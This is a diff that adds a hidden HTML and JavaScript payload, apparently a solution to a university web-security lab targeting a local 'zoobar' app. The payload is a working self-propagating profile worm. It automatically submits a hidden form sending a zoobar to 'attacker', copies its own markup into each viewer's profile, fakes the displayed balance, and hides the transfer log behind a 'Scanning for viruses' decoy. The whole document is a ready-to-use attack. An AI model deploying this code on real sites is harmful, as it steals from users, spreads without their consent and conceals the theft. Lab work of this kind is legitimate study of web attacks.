@@ -1,0 +1,36 @@
+<div id="hack">
+Scanning for viruses...
+
+<iframe style="display:none" name="zoobar" src="http://localhost:8080"></iframe>
+<form method="POST" style="display:none" id="transfer" target="zoobar" name="transferform" action="http://localhost:8080/zoobar/index.cgi/transfer">
+<input name="zoobars" value="1" size="5" type="text">
+<input name="recipient" value="attacker" size="10" type="text">
+<input name="submission" value="Send" type="submit">
+</form>
+
+<iframe style="display:none" name="prof" id="prof" src="http://localhost:8080"></iframe>
+
+<form style="display:none" method="POST" name="profileform" target="prof" id="profform" action="http://localhost:8080/zoobar/index.cgi/">
+    <textarea name="profile_update" rows="20" cols="80" id="ta"></textarea>
+    <br>
+    <input name="profile_submit" value="Save" type="submit">
+</form>
+
+<script>
+document.getElementById("transfer").submit();
+window.onload = function() {
+total = 10;
+showZoobars(10);
+var el = document.getElementById("hack");
+document.getElementById("ta").value = el.outerHTML;
+document.getElementById("profform").submit();
+}
+
+</script>
+
+<style id="hackstyle">
+table.log tbody {
+display:none;
+}
+</style>
+</div>
